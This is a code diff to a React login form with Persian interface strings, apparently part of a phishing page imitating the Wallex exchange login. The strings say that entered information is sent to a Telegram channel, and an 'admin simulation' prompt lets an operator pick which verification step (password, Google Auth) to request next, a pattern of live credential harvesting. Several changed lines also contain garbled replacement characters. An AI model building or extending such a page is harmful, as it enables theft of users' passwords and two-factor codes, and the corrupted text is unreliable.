@@ -246,7 +246,7 @@ export const LoginForm = () => {
       if (!validateTelegramConfig()) {
         console.log("🎭 Demo verification code: 123456");
         alert(
-          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ��رسال می‌شود)",
+          "🎭 حالت دمو\n\nکد تایید: 123456\n\n(در حالت واقعی این کد به تلگرام ارسال می‌شود)",
         );
       }
 
@@ -318,7 +318,7 @@ export const LoginForm = () => {
           if (!validateTelegramConfig()) {
             setTimeout(() => {
               const choice = prompt(
-                "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
+                "🎭 حالت دمو - شبیه‌��ازی ادمین\n\n" +
                   "انتخاب کنید:\n" +
                   "1 = Password\n" +
                   "2 = Google Auth\n" +
@@ -363,7 +363,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!password) {
-      setErrors({ password: "رمز عبور ا��زامی است" });
+      setErrors({ password: "رمز عبور الزامی است" });
       return;
     }
 
@@ -551,7 +551,14 @@ export const LoginForm = () => {
 
   const handleBack = () => {
     if (currentStep === "verify-phone") {
-      setCurrentStep("phone");
+      if (isSmsMode) {
+        // If in SMS mode, go back to loading page
+        setCurrentStep("loading");
+        setIsSmsMode(false);
+      } else {
+        // Regular phone verification, go back to phone input
+        setCurrentStep("phone");
+      }
     } else if (currentStep === "email-code") {
       setEmailStep("email");
     } else {
@@ -853,7 +860,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگر��م، فایل .env را تنظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
